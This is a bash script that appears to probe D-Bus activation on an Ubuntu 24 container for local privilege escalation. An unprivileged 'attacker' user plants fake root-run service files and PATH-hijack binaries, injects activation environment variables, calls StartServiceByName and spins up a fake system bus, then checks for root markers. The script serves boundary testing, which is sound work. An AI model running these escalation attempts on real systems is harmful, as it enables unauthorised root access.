#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/dbus-activation-helper.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n## %s\n' "$1"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "D-Bus activation helper boundary probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=dbus_activation_helper_probe
pkill -f /usr/lib/software-properties/software-properties-dbus 2>/dev/null || true
systemctl stop systemd-hostnamed.service 2>/dev/null || true
runuser -u "$ATTACKER" -- dbus-update-activation-environment --verbose DBUS_ACTIVATION_PROBE 2>/dev/null || true
rm -rf "/home/${ATTACKER}/${probe}" \
  "/home/${ATTACKER}/.local/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/system-services/org.freedesktop.hostname1.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/system-services/com.example.DbusActivationProbe.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/services/com.example.DbusActivationProbe.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/services/com.example.FakeSystemProbe.service" \
  /tmp/${probe}* \
  /root/${probe}* 2>/dev/null || true
systemctl reset-failed systemd-hostnamed.service dbus.service dbus.socket 2>/dev/null || true
true
TARGET

target_root "target identity and default package proof" <<'TARGET'
set +e
echo "== identity =="
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
runuser -u "$ATTACKER" -- bash -lc 'id; groups; command -v sudo >/dev/null && sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== dbus package versions =="
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
  dbus dbus-bin dbus-daemon dbus-session-bus-common dbus-system-bus-common \
  libdbus-1-3 python3-dbus systemd polkitd 2>/dev/null | sort

echo
echo "== system bus service state =="
systemctl show -p LoadState -p ActiveState -p SubState -p FragmentPath -p UnitFileState dbus.service dbus.socket 2>&1
busctl --system list --no-pager | sed -n '1,120p'
TARGET

target_root "default activation files, helper, and policy" <<'TARGET'
set +e
echo "== launch helper and dbus tools =="
for p in /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/dbus-daemon \
  /usr/bin/dbus-send /usr/bin/busctl /usr/bin/dbus-update-activation-environment; do
  [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %a %U:%G %F %n -> %N' "$p" || echo "MISSING $p"
done
getent group messagebus || true
id "$ATTACKER"

echo
echo "== dbus config and service directories =="
for p in /usr/share/dbus-1/system.conf /etc/dbus-1/system.conf \
  /usr/share/dbus-1/system-services /etc/dbus-1/system-services /usr/local/share/dbus-1/system-services \
  /usr/share/dbus-1/system.d /etc/dbus-1/system.d \
  /usr/share/dbus-1/services /usr/local/share/dbus-1/services /etc/dbus-1/session.d \
  /var/lib/dbus /var/lib/dbus/machine-id /etc/machine-id /run/dbus /run/dbus/system_bus_socket; do
  [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %a %U:%G %F %n -> %N' "$p" || echo "MISSING $p"
done

echo
echo "== system.conf activation boundary excerpts =="
nl -ba /usr/share/dbus-1/system.conf | sed -n '20,90p;120,140p'

echo
echo "== system bus service files =="
for f in /usr/share/dbus-1/system-services/*.service; do
  echo "### $f"
  stat -Lc '%A %a %U:%G %n' "$f"
  nl -ba "$f"
done

echo
echo "== system bus policy files =="
find /usr/share/dbus-1/system.d /etc/dbus-1/system.d -maxdepth 1 -type f -printf '%M %u:%g %p\n' 2>/dev/null | sort
grep -RIn 'UpdateActivationEnvironment\|deny own\|allow own\|send_destination="org.freedesktop.DBus"' \
  /usr/share/dbus-1/system.conf /usr/share/dbus-1/system.d /etc/dbus-1/system.d 2>/dev/null | sed -n '1,260p'

echo
echo "== Exec path classification =="
awk -F= '
  /^Name=/{name=$2}
  /^Exec=/{exec=$2; printf "%s name=%s exec=%s class=%s\n", FILENAME, name, exec, exec ~ /^\// ? "absolute" : "NON_ABSOLUTE"}
  /^User=/{user=$2; printf "%s name=%s user=%s\n", FILENAME, name, user}
  /^SystemdService=/{printf "%s name=%s systemd_service=%s\n", FILENAME, name, $2}
' /usr/share/dbus-1/system-services/*.service | sort

echo
echo "== systemd-mediated D-Bus activation units =="
grep -h '^SystemdService=' /usr/share/dbus-1/system-services/*.service | cut -d= -f2- | sort -u |
while read -r unit; do
  echo "### $unit"
  systemctl show -p LoadState -p ActiveState -p FragmentPath -p User -p Group -p Environment -p ExecStart "$unit" 2>&1 || true
done
TARGET

target_attacker "attacker writability and direct helper boundary" <<'ATTACKER'
set +e
probe=dbus_activation_helper_probe
base="$HOME/$probe"
mkdir -p "$base" "$HOME/.local/share/dbus-1/system-services" "$HOME/.local/share/dbus-1/services"

echo "== attacker identity and ambient D-Bus env =="
id
groups
printf 'DBUS_SESSION_BUS_ADDRESS=%s\n' "${DBUS_SESSION_BUS_ADDRESS-unset}"
printf 'DBUS_SYSTEM_BUS_ADDRESS=%s\n' "${DBUS_SYSTEM_BUS_ADDRESS-unset}"

echo
echo "== attacker access to root activation paths =="
for p in /usr/share/dbus-1/system-services /etc/dbus-1/system-services /usr/local/share/dbus-1/system-services \
  /usr/share/dbus-1/system.d /etc/dbus-1/system.d /usr/share/dbus-1/system.conf \
  /var/lib/dbus /var/lib/dbus/machine-id /run/dbus /run/dbus/system_bus_socket \
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    [ -w "$p" ] && echo "W $p" || echo "NO_W $p"
    [ -x "$p" ] && echo "X $p" || echo "NO_X $p"
  else
    echo "MISSING $p"
  fi
done

try_write() {
  local path="$1"
  printf 'write %s -> ' "$path"
  if bash -c 'printf "probe\n" > "$1"' bash "$path" 2>"$base/write.err"; then
    echo OK
    rm -f "$path"
  else
    sed -n '1p' "$base/write.err" 2>/dev/null || echo "failed"
  fi
  rm -f "$base/write.err"
}

echo
echo "== direct writes to root activation roots =="
try_write /usr/share/dbus-1/system-services/com.example.DbusActivationProbe.service
try_write /etc/dbus-1/system.d/com.example.DbusActivationProbe.conf
try_write /usr/share/dbus-1/system.conf
try_write /var/lib/dbus/machine-id
try_write /run/dbus/system_bus_socket

echo
echo "== direct launch-helper execution =="
/usr/lib/dbus-1.0/dbus-daemon-launch-helper com.ubuntu.SoftwareProperties 2>&1
echo "helper_rc=$?"

echo
echo "== owning names on system bus =="
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus RequestName su com.ubuntu.SoftwareProperties 0 2>&1
echo "request_reserved_rc=$?"
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus RequestName su com.example.AttackerOwned 0 2>&1
echo "request_arbitrary_rc=$?"
true
ATTACKER

target_root "prepare inactive services for activation attempts" <<'TARGET'
set +e
pkill -f /usr/lib/software-properties/software-properties-dbus 2>/dev/null || true
systemctl stop systemd-hostnamed.service 2>/dev/null || true
sleep 1
echo "software-properties pids before activation:"
pgrep -a -f /usr/lib/software-properties/software-properties-dbus || true
echo "systemd-hostnamed state before activation:"
systemctl show -p ActiveState -p SubState systemd-hostnamed.service 2>/dev/null || true
true
TARGET

target_attacker "system bus environment injection and activation attempts" <<'ATTACKER'
set +e
probe=dbus_activation_helper_probe
base="$HOME/$probe"
mkdir -p "$base/bin" "$base/tmp" "$HOME/.local/share/dbus-1/system-services"

for name in software-properties-dbus netplan-dbus packagekitd fwupd boltd udisksd ModemManager \
  systemd-hostnamed systemd-localed systemd-networkd systemd-timedated systemd-timesyncd false; do
  cat > "$base/bin/$name" <<EOF
#!/bin/sh
{
  echo "fake $name hit"
  id
  env | sort
} >> "$base/fake-path-hits"
id > "/tmp/${probe}_fake_path_hit_$name"
EOF
  chmod +x "$base/bin/$name"
done

cat > "$HOME/.local/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service" <<EOF
[D-BUS Service]
Name=com.ubuntu.SoftwareProperties
Exec=$base/bin/software-properties-dbus
User=root
EOF

cat > "$HOME/.local/share/dbus-1/system-services/org.freedesktop.hostname1.service" <<EOF
[D-BUS Service]
Name=org.freedesktop.hostname1
Exec=$base/bin/systemd-hostnamed
User=root
EOF

cat > "$HOME/.local/share/dbus-1/system-services/com.example.DbusActivationProbe.service" <<EOF
[D-BUS Service]
Name=com.example.DbusActivationProbe
Exec=$base/bin/software-properties-dbus
User=root
EOF

echo "== deny system bus activation environment updates =="
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus UpdateActivationEnvironment 'a{ss}' 4 \
  PATH "$base/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
  TMPDIR "$base/tmp" \
  DBUS_ACTIVATION_PROBE "$probe" \
  DBUS_SYSTEM_BUS_ADDRESS "unix:path=$base/attacker-system-bus.sock" 2>&1
echo "update_activation_environment_rc=$?"

echo
echo "== direct D-Bus helper activation: com.ubuntu.SoftwareProperties =="
PATH="$base/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
TMPDIR="$base/tmp" DBUS_ACTIVATION_PROBE="$probe" \
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus StartServiceByName su com.ubuntu.SoftwareProperties 0 2>&1
echo "start_softwareproperties_rc=$?"

echo
echo "== systemd-mediated activation: org.freedesktop.hostname1 =="
PATH="$base/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
TMPDIR="$base/tmp" DBUS_ACTIVATION_PROBE="$probe" \
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus StartServiceByName su org.freedesktop.hostname1 0 2>&1
echo "start_hostname1_rc=$?"

echo
echo "== user-local system-services file ignored by real system bus =="
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus StartServiceByName su com.example.DbusActivationProbe 0 2>&1
echo "start_user_local_system_service_rc=$?"

echo
echo "== attacker-observed fake PATH hits =="
if [ -s "$base/fake-path-hits" ]; then
  cat "$base/fake-path-hits"
else
  echo "NO_FAKE_PATH_HITS"
fi
ls -l /tmp/${probe}_fake_path_hit_* 2>&1 || true
true
ATTACKER

target_root "root-side activation result inspection" <<'TARGET'
set +e
probe=dbus_activation_helper_probe
echo "== root processes after activation =="
pgrep -a -f /usr/lib/software-properties/software-properties-dbus || true
pgrep -a -f /usr/lib/systemd/systemd-hostnamed || true

echo
echo "== activated process environments =="
for pid in $(pgrep -f '/usr/lib/software-properties/software-properties-dbus|/usr/lib/systemd/systemd-hostnamed' 2>/dev/null); do
  echo "### pid=$pid $(ps -p "$pid" -o user=,comm=,args=)"
  tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null |
    grep -E '^(PATH=|TMPDIR=|DBUS_ACTIVATION_PROBE=|DBUS_SYSTEM_BUS_ADDRESS=|DBUS_STARTER_ADDRESS=|DBUS_STARTER_BUS_TYPE=)' || true
done

echo
echo "== root marker checks =="
if ls -l /tmp/${probe}_fake_path_hit_* /root/${probe}* 2>/dev/null; then
  echo "UNEXPECTED_ROOT_MARKER_OR_FAKE_PATH_HIT"
else
  echo "NO_ROOT_MARKERS"
fi
if [ -s "/home/${ATTACKER}/${probe}/fake-path-hits" ]; then
  echo "UNEXPECTED_HOME_FAKE_PATH_HITS"
  cat "/home/${ATTACKER}/${probe}/fake-path-hits"
else
  echo "NO_HOME_FAKE_PATH_HITS"
fi
true
TARGET

target_attacker "user-controlled fake system bus address" <<'ATTACKER'
set +e
probe=dbus_activation_helper_probe
base="$HOME/$probe/fake-system-bus"
rm -rf "$base"
mkdir -p "$base"

echo "== start a user-owned bus with system.conf and a user socket =="
dbus-daemon --config-file=/usr/share/dbus-1/system.conf \
  --address="unix:path=$base/custom-system.sock" \
  --fork --nopidfile --print-address=1 --print-pid=1 > "$base/bus.out" 2>&1
rc=$?
echo "custom_system_bus_rc=$rc"
cat "$base/bus.out"
if [ "$rc" -eq 0 ]; then
  pid="$(tail -n 1 "$base/bus.out")"
  echo "custom_system_bus_pid=$pid"
  ps -p "$pid" -o pid=,uid=,user=,comm=,args=
  DBUS_SYSTEM_BUS_ADDRESS="unix:path=$base/custom-system.sock" \
    dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply \
    /org/freedesktop/DBus org.freedesktop.DBus.StartServiceByName \
    string:com.ubuntu.SoftwareProperties uint32:0 2>&1
  echo "fake_system_bus_start_rc=$?"
  kill "$pid" 2>/dev/null || true
fi
true
ATTACKER

target_attacker "session bus activation contrast" <<'ATTACKER'
set +e
probe=dbus_activation_helper_probe
base="$HOME/$probe/session"
rm -rf "$base"
mkdir -p "$base" "$HOME/.local/share/dbus-1/services"

cat > "$base/session-service.sh" <<'EOF'
#!/bin/sh
export DBUS_SESSION_BUS_ADDRESS="${DBUS_STARTER_ADDRESS:-${DBUS_SESSION_BUS_ADDRESS:-}}"
{
  echo "id=$(id)"
  echo "DBUS_ACTIVATION_PROBE=${DBUS_ACTIVATION_PROBE-unset}"
  echo "TMPDIR=${TMPDIR-unset}"
  echo "PATH=$PATH"
  echo "DBUS_STARTER_BUS_TYPE=${DBUS_STARTER_BUS_TYPE-unset}"
  echo "DBUS_SESSION_BUS_ADDRESS=${DBUS_SESSION_BUS_ADDRESS-unset}"
} > "$HOME/dbus_activation_helper_probe/session/marker"
dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.RequestName \
  string:com.example.DbusActivationProbe uint32:0 >> "$HOME/dbus_activation_helper_probe/session/marker" 2>&1
sleep 1
EOF
chmod +x "$base/session-service.sh"

cat > "$HOME/.local/share/dbus-1/services/com.example.DbusActivationProbe.service" <<EOF
[D-BUS Service]
Name=com.example.DbusActivationProbe
Exec=$base/session-service.sh
EOF

DBUS_ACTIVATION_PROBE=session_env TMPDIR="$base/tmp" dbus-run-session -- bash -lc '
  mkdir -p "$TMPDIR"
  dbus-update-activation-environment DBUS_ACTIVATION_PROBE TMPDIR PATH
  dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply \
    /org/freedesktop/DBus org.freedesktop.DBus.StartServiceByName \
    string:com.example.DbusActivationProbe uint32:0
  sleep 1
' 2>&1
echo "session_activation_rc=$?"
echo "== session activation marker =="
cat "$base/marker" 2>&1 || true
true
ATTACKER

target_root "cleanup after probe and final health" <<'TARGET'
set +e
probe=dbus_activation_helper_probe
pkill -f /usr/lib/software-properties/software-properties-dbus 2>/dev/null || true
systemctl stop systemd-hostnamed.service 2>/dev/null || true
rm -rf "/home/${ATTACKER}/${probe}" \
  "/home/${ATTACKER}/.local/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/system-services/org.freedesktop.hostname1.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/system-services/com.example.DbusActivationProbe.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/services/com.example.DbusActivationProbe.service" \
  "/home/${ATTACKER}/.local/share/dbus-1/services/com.example.FakeSystemProbe.service" \
  /tmp/${probe}* \
  /root/${probe}* 2>/dev/null || true
systemctl reset-failed systemd-hostnamed.service dbus.service dbus.socket 2>/dev/null || true

echo "== leftover check =="
find "/home/${ATTACKER}" -maxdepth 3 \( -name "${probe}" -o -name '*DbusActivationProbe.service' \) -print 2>/dev/null || true
find /tmp -maxdepth 1 -name "${probe}*" -print 2>/dev/null || true
ls -l /root/${probe}* 2>/dev/null || true

echo
echo "== target health =="
systemctl is-system-running 2>/dev/null || true
systemctl --failed --no-legend 2>/dev/null || true
true
TARGET

echo
echo "Probe complete. Log: $LOG"
